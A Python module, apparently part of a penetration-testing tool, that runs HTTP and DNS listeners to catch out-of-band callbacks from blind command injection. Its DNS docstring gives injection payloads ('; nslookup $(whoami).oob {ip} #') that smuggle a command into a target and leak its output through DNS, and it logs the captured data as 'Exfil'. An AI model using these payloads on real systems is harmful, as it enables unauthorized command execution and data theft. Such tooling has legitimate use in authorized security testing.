import threading
import struct
from http.server import BaseHTTPRequestHandler, HTTPServer
from queue import Queue
import socket


# ─────────────────────────────────────────────
#  HTTP LISTENER
# ─────────────────────────────────────────────

def _make_handler(oob_queue: Queue):
    """Factory so the handler class can reference the shared queue."""

    class OOBHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            path = self.path

            print("\n" + "=" * 55)
            print(f"[!!!] ALERT: HTTP CALLBACK RECEIVED [!!!]")
            print(f"  Source : {self.client_address[0]}")
            print(f"  Path   : {path}")
            print("=" * 55 + "\n")

            oob_queue.put(("http", path))

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Logged.")

        def log_message(self, format, *args):
            return  # Suppress default access-log noise

    return OOBHandler


def start_listener(ip: str, port: int, oob_queue: Queue = None):
    """Start the OOB HTTP listener."""
    if oob_queue is None:
        oob_queue = Queue()

    handler = _make_handler(oob_queue)
    server  = HTTPServer((ip, port), handler)
    print(f"[*] HTTP Listener active on http://{ip}:{port}")
    server.serve_forever()


# ─────────────────────────────────────────────
#  DNS LISTENER
# ─────────────────────────────────────────────

def _parse_dns_query(data: bytes) -> str:
    """
    Minimal DNS query parser.
    Returns the queried domain name from the question section.
    """
    try:
        # DNS header is 12 bytes — skip it
        idx = 12
        labels = []
        while idx < len(data):
            length = data[idx]
            if length == 0:
                break
            idx += 1
            labels.append(data[idx: idx + length].decode("utf-8", errors="ignore"))
            idx += length
        return ".".join(labels)
    except Exception:
        return ""


def start_dns_listener(ip: str, port: int, oob_queue: Queue = None):
    """
    Start the OOB DNS listener on UDP.

    NOTE: Binding to port 53 requires root/sudo on Linux.
    Run with: sudo python3 main.py

    Payload example injected into target:
        ; nslookup $(whoami).oob {ip} #
        ; host $(whoami).oob {ip} #

    When the target resolves the domain, the subdomain carries the
    command output (e.g. 'root.oob') back to this listener.
    """
    if oob_queue is None:
        oob_queue = Queue()

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((ip, port))
        print(f"[*] DNS  Listener active on udp://{ip}:{port}")
    except PermissionError:
        print(f"[!] DNS listener needs sudo to bind port {port}. Skipping DNS probes.")
        return
    except Exception as e:
        print(f"[!] DNS listener error: {e}. Skipping DNS probes.")
        return

    while True:
        try:
            data, addr = sock.recvfrom(512)
            domain    = _parse_dns_query(data)
            subdomain = domain.split(".")[0] if domain else "unknown"

            print("\n" + "=" * 55)
            print(f"[!!!] ALERT: DNS CALLBACK RECEIVED [!!!]")
            print(f"  Source  : {addr[0]}")
            print(f"  Domain  : {domain}")
            print(f"  Exfil   : {subdomain}")
            print("=" * 55 + "\n")

            oob_queue.put(("dns", f"/dns/{subdomain}"))

            # Send a minimal valid DNS response so the target doesn't hang
            try:
                if len(data) >= 2:
                    resp = bytearray(data[:2])
                    resp += b'\x81\x80'
                    resp += data[4:6]
                    resp += b'\x00\x00'
                    resp += b'\x00\x00'
                    resp += b'\x00\x00'
                    resp += data[12:]
                    sock.sendto(bytes(resp), addr)
            except Exception:
                pass

        except Exception:
            pass


# ─────────────────────────────────────────────
#  STANDALONE TESTING
# ─────────────────────────────────────────────

if __name__ == "__main__":
    MY_IP     = "127.0.0.1"
    HTTP_PORT = 8000
    DNS_PORT  = 5353   # Use 53 in production (needs sudo)

    test_queue = Queue()

    threading.Thread(
        target=start_listener,
        args=(MY_IP, HTTP_PORT, test_queue),
        daemon=True
    ).start()

    threading.Thread(
        target=start_dns_listener,
        args=(MY_IP, DNS_PORT, test_queue),
        daemon=True
    ).start()

    print(f"[*] HTTP test: curl http://{MY_IP}:{HTTP_PORT}/test")
    print(f"[*] DNS  test: nslookup root.oob {MY_IP} -port={DNS_PORT}")
    print(f"[*] Waiting for callbacks (Ctrl+C to stop)...\n")

    try:
        while True:
            try:
                proto, hit = test_queue.get(timeout=1)
                print(f"[+] Queue received ({proto}): {hit}")
            except Exception:
                pass
    except KeyboardInterrupt:
        print("\n[*] Shutting down listeners.")